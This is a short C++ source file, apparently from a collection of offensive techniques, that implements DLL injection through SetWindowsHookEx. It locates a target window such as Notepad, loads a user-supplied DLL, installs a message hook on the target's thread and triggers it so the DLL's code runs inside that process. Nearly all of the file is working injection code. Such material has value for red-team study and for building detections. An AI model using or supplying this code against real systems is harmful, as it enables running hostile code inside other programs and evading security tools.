/*
* Title: Dll Injection via SetWindowsHookEx
* Resources:
*	- https://github.com/DrNseven/SetWindowsHookEx-Injector
*/
#include <Windows.h>
#include <iostream>

BOOL DllInjectionViaSetWindowsHookEx() {
	LPCWSTR lpWindowClassName = L"Notepad"; // Replace it with the target windows class.

	LPCWSTR lpDll = L"C:\\HookDll.dll"; // Replace it with your own DLL to execute.
	LPCSTR lpHookFuncName = "NextHook";

	HWND hWnd = FindWindow(lpWindowClassName, nullptr);
	if (!hWnd) {
		system("pause");
		return FALSE;
	}

	// Get the thread of the window and the PID.
	DWORD dwPid = 0;
	DWORD dwTid = GetWindowThreadProcessId(hWnd, &dwPid);
	if (!dwTid) {
		system("pause");
		return FALSE;
	}

	// Load DLL to be executed.
	HMODULE hDll = LoadLibraryEx(lpDll, nullptr, DONT_RESOLVE_DLL_REFERENCES);
	if (!hDll) {
		system("pause");
		return FALSE;
	}

	// Get exported function address in the DLL.
	HOOKPROC addr = (HOOKPROC)GetProcAddress(hDll, lpHookFuncName);
	if (!addr) {
		system("pause");
		return FALSE;
	}

	// Set the hook in the hook chain.
	HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, addr, hDll, dwTid);
	if (!hHook) {
		system("pause");
		return FALSE;
	}

	// Trigger the hook.
	PostThreadMessage(dwTid, WM_NULL, NULL, NULL);

	std::cout << "Hook set and triggered." << std::endl;

	// Wait for user input to remove the hook.
	std::cout << "Press any key to unhook." << std::endl;
	system("pause > nul");

	// Unhook
	if (!UnhookWindowsHookEx(hHook)) {
		system("pause");
		return FALSE;
	}

	std::cout << "Press any key to exit." << std::endl;
	system("pause > nul");

	return TRUE;
}
